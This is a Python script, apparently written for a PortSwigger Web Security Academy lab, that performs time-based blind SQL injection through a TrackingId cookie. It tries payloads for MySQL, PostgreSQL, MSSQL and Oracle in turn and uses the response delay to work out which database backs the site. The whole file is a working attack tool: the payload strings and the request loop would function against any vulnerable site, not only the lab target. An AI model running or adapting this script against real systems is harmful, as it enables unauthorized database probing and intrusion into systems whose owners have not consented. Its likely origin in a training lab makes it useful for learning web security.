import requests

URL = 'https://0ac600df044512b5806c08dd00aa0070.web-security-academy.net/'
COOKIE_NAME = 'TrackingId'
TIMEOUT = 15
DATABASES = ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']

def SQLi_test(url, cookie_name, timeout=5):
    initial_response = requests.get(url, timeout=timeout)
    cookie = initial_response.cookies[cookie_name]

    for database in DATABASES:
        payload = ''

        if database == 'PostgreSQL':
            payload = '\' AND (SELECT CASE WHEN(1 = 1) THEN pg_sleep(10)::text ELSE pg_sleep(0)::text END) = \'1\'-- '
        elif database == 'MySQL':
            payload = '\' AND (SELECT IF(1=1, SLEEP(10),\'a\'))'
        elif database == 'MSSQL':
            payload = '\'%3B IF (1=1) WAITFOR DELAY \'0:0:10\''
        elif database == 'Oracle':
            payload = '\'%3B SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),10) ELSE NULL END FROM dual'

        response = requests.get(url, cookies={cookie_name: cookie + payload}, timeout=timeout)

        if response.elapsed.total_seconds() >= 10:
            print(response.request._cookies.get(cookie_name))
            print('SQLi test was successful! The database is ' + database)
            return database
        else:
            print(response.request._cookies.get(cookie_name))
            print(f'SQLi test failed for cookie {cookie_name} assuming a {database} database.')
            print('Status code: ' + str(response.status_code))

if __name__ == '__main__':
    SQLi_test(URL, COOKIE_NAME, TIMEOUT)